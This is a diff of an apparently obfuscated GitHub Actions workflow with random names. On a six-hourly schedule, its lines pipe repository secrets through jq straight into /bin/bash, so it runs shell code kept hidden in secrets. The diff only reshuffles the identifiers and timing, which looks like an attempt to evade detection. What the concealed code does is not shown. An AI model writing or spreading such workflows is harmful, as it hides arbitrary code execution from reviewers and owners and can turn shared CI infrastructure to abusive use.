@@ -1,10 +1,8 @@
 name: wanf2xy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 5/6 * * *'
-
+    - cron: '23 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: wanf2xy
         env:
-          zo75: ${{ secrets.zo75 }}
+          fl6229: ${{ secrets.fl6229 }}
         run: |
-          echo $zo75 | jq -r .xjlt50096 | /bin/bash
-          echo $wrqn48 | jq -r .sy20 | /bin/bash
-          echo $phm4 | jq -r .gvjqs611 | /bin/bash
-          echo $hm23 | jq -r .pkwpt51259 | /bin/bash
-          echo $ainfz02 | jq -r .cppf7647 | /bin/bash
-          echo $e9472 | jq -r .fz29542 | /bin/bash
-          echo $spy43 | jq -r .erl78 | /bin/bash
-          echo $lipwq56884 | jq -r .i43344 | /bin/bash
-          echo $xa1 | jq -r .fr2 | /bin/bash
+          echo $fl6229 | jq -r .qohzn04756 | /bin/bash
+          echo $whzs58744 | jq -r .c8 | /bin/bash
+          echo $dkdq1941 | jq -r .us82319 | /bin/bash
+          echo $k73083 | jq -r .hequq42525 | /bin/bash
+          echo $qcdz99 | jq -r .tawau613 | /bin/bash
+          echo $an54315 | jq -r .wtgka5022 | /bin/bash
+          echo $mjau65602 | jq -r .vsiyk1 | /bin/bash
+          echo $kl9 | jq -r .retcx462 | /bin/bash
 
